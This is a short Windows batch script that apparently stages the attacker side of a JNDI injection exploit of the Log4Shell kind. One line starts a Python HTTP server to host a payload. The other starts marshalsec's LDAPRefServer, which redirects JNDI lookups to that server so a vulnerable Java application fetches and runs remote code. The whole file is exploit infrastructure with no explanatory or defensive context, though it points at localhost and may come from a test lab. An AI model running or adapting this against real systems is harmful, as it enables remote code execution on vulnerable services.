start cmd /C "cd scripts && python -m http.server"
start cmd /C "java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8000/#"